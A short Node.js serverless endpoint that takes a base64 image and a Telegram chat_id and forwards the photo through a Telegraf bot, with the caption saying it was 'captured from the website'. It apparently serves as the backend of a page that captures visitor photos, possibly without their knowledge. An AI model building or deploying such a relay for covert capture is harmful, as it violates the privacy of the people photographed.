const { Telegraf } = require("telegraf");

const bot = new Telegraf(process.env.BOT_TOKEN);

module.exports = async (req, res) => {

  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method Not Allowed" });
  }

  try {

    const { image, chat_id } = req.body;

    // Check image
    if (!image) {
      return res.status(400).json({ error: "No image provided" });
    }

    // Check chat id
    if (!chat_id) {
      return res.status(400).json({ error: "No chat_id provided" });
    }

    // Remove base64 header (jpeg/png/webp supported)
    const base64Data = image.replace(/^data:image\/\w+;base64,/, "");

    // Convert base64 → buffer
    const buffer = Buffer.from(base64Data, "base64");

    // Send photo to the Telegram user
    await bot.telegram.sendPhoto(
      chat_id,
      { source: buffer },
      {
        caption: `📸 <b>IMAGE RECEIVED</b>

A photo was captured from the website and sent to your Telegram.`,
        parse_mode: "HTML"
      }
    );

    return res.status(200).json({
      status: "success",
      message: "Image sent to Telegram user"
    });

  } catch (error) {

    console.error("Capture API Error:", error);

    return res.status(500).json({
      error: "Server error while processing image"
    });

  }

};
